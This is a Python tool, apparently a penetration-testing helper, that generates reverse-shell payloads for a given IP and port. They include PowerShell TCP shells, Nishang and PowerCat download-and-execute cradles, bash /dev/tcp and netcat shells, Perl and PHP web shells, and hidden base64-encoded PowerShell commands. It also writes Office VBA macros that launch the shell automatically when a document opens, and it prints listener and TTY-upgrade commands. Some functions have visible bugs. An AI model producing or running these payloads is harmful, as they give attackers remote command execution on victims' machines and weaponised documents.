#!/usr/bin/python3

import sys
import subprocess
from base64 import b64encode
import argparse

# Macro number of chars per line
chunk_size=32
use_macro = False


def build(payload):
    # Codificar la cadena en UTF-16LE
    string2 = payload.encode("utf-16le")
    
    # Ejecutar el comando base64
    process = subprocess.Popen(
        "base64 -w 0; echo", 
        shell=True, 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )
    
    # Enviar los datos al proceso y obtener la salida
    stdout, stderr = process.communicate(input=string2)
    
    # Verificar si hubo errores
    if process.returncode != 0:
        raise RuntimeError(f"Command failed with error: {stderr.decode('utf-8')}")
    
    # Decodificar y retornar la salida
    b64 = stdout.decode('utf-8').strip()
    return b64


def macro(pay):
            
    size = chunk_size - 1
    chunks = [pay[i:i+size] for i in range(0, len(pay), size)]
            
    for i, chunk in enumerate(chunks):
        #print(f"Trozos {i+1}: {chunk}")
        if i == 0:
            print(f"Sub AutoOpen()")
            print(f"\tMyMacro")
            print(f"End Sub\n")
            print("Sub Document_Open()")
            print("\tMyMacro")
            print("End Sub\n")

            print("Sub MyMacro()")
            print(f"\tDim Str As String\n")

            print(f"\tStr = Str + \"powershell.exe -nop -w hidden -enc {chunk}\"")
        else:
            print(f"\tStr = Str + \"{chunk}\"")

    print(f'\n\tCreateObject("Wscript.Shell").Run Str')
    print(f'End Sub')

def print_listener(port):
    print("\n********** Listener **********\n")
    print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
    print(f"rlwrap -cAr nc -nlvp {port}")

def print_tty():
    print("\n********** tty **********\n")
    print(f"script /dev/null -c bash")
    print(f"ctrl + z")
    print(f"stty raw -echo; fg")
    print(f"export TERM=xterm; reset xterm")

    print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")

    print("\n\n********** PowerShell payload b64 encode **********\n")
    print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")


def print_powershell(ip, port, use_macro):

    print("\n\n*******************************************************")
    print("                      PAYLOADS                    ")
    print("*******************************************************")
    print("\n\n********** Powershell reverse shell oneliner **********\n")
    text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    print(text)
    pay = build(text)
    
    if use_macro:
        print("\n\n\n********** Powershell reverse shell base64 Macro **********\n")
        macro(pay)
    else:
        print("\n\n\n********** Powershell reverse shell base64 **********\n")
        print(f"powershell -nop -w hidden -enc {pay}")



def print_conpty(ip, port, rows, columns, use_macro):
    print("\n\n********** ConPtyShell RevShell **********\n")
    payload = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
    print(payload)

    print("\n********** ConPtyShell RevShell b64 **********\n")   
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** ConPtyShell Download & IEX **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
    print(payload)

    print("\n********** ConPtyShell Download & IEX b64 **********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** ConPtyShell Download, IEX & Execution **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
    print(payload)
    p64 = build(payload)

    if use_macro:
        print("\n\n********** ConPTY reverse shell base64 Macro **********\n")
        macro(p64)
    else:
        print("\n\n********** ConPtyShell Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {p64}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80")


def print_nishang(ip, port, use_macro):

    print("\n\n********** Nishang payload **********\n")
    payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    print(payload)

    print("\n********** Nishang payload b64**********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & IEX **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
    print(payload)

    print("\n********** Nishang Download & IEX b64 **********\n") 
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & Execution **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    print(payload)
    p64 = build(payload)
    
    if use_macro:
        print("\n\n********** Nishang reverse shell base64 Macro **********\n")
        macro(p64)
    else:
        print("\n\n********** Nishang Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {p64}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80")


def print_powercat(ip, port, use_macro):

    
    print("\n\n\n********** PowerCat payload **********\n")
    payload = "powercat -c {ip} -p {port} -e powershell"
    print(payload)

    print("\n********** PowerCat payload b64**********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download & IEX **********\n")
    payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
    print(payload)

    print("\n********** PowerCat Download & IEX b64 **********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download & Execution **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
    print(payload)
    p64 = build(payload)
    print(p64)

    if use_macro:
        print("\n\n********** Powercat reverse shell base64 Macro **********\n")
        macro(p64)
    else:
        print("\n\n********** Powercat Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {p64}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80")


def print_perl():

    print("\n********** Perl **********\n")
    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    print(perl_payload)



def print_php(ip, port):


    php_payloads = [
        """<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>""",
        '<%3fphp+if(isset($_REQUEST[\'cmd\'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST[\'cmd\'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>',
        '<?php echo system($_GET[\'cmd\']); ?>',
        '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
    ]
    for payload in php_payloads:
        print(payload)

    print(f"\nphp -r '$sock=fsockopen('{ip}',{port});exec('/bin/sh <&3 >&3 2>&3');'")

def print_bash(ip, port):

    print("\n\n\n********** Bash **********\n")
    bash_payloads = [
        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
        f"nc {ip} {port} -e /bin/sh"
    ]
    for payload in bash_payloads:
        print(payload)



def print_nc(ip, port):
    print("\n********** Netcat Bind Shell **********\n")
    print("Linux:\n")
    print(f"\tnc -nlvp {port} -e /bin/bash")
    print(f"\tnc {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -nlvp {port} -e cmd.exe")
    print(f"\tnc {ip} {port}")

    print("\n********** Netcat Reverse Shell **********\n")
    print("Linux:\n")
    print(f"\twhich /usr/bin/nc")
    print(f"\tnc -e /bin/bash {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -e cmd {ip} {port}")
    print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")

    print(f"More shells at: /usr/share/webshells\n")


def main(use_macro):
    if len(sys.argv) < 4:
        print("\n\tUsage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
        print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
        print(f"\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
        print("\nExamples:\n")
        print(f"\tshell 192.168.1.72 4444 -php")
        print(f"\tshell 192.168.1.72 4444 -powershell")
        print(f"\tshell 192.168.1.72 4444 -nishang --macro")
        print(f"\tshell 192.168.1.72 4444 -conpty 54 118")

        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    shell_type = sys.argv[3].lower()

    # Verificar si el argumento --macro está presente
    
    if '--macro' in sys.argv:
        use_macro = True
        # Eliminar el argumento --macro de la lista de argumentos
        sys.argv.remove('--macro')

    # Verificar el número mínimo de argumentos
    if len(sys.argv) > 4:
        try:
            rows = int(sys.argv[4])
            cols = int(sys.argv[5])
        except (IndexError, ValueError):
            print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
            print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
            sys.exit(1)
    else:
        # Si no se pasan rows y cols, utilizar valores por defecto o los valores obtenidos de stty
        output = subprocess.check_output(["stty", "size"]).decode().strip()
        rows, cols = map(int, output.split())

    # Verificar si el argumento --macro se usa con el shell_type correcto
    if use_macro and shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
        print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
        sys.exit(1)

    print_listener(port)
    print_tty()

    if shell_type == "-powershell":
        print(use_macro)
        print_powershell(ip, port, use_macro)
    elif shell_type == "-powercat":
        print_powercat(ip, port, use_macro)
    elif shell_type == "-nishang":
        print_nishang(ip, port, use_macro)
    elif shell_type == "-conpty":
        print_conpty(ip, port, rows, cols, use_macro)
    elif shell_type == "-php":
        print_php(ip, port)
    elif shell_type == "-bash":
        print_bash(ip, port)
    elif shell_type == "-perl":
        print_perl(ip, port)
    elif shell_type == "-nc":
        print_nc(ip, port)
    else:
        print(f"Shell type '{shell_type}' not recognized.")

if __name__ == "__main__":
    
    main(use_macro)
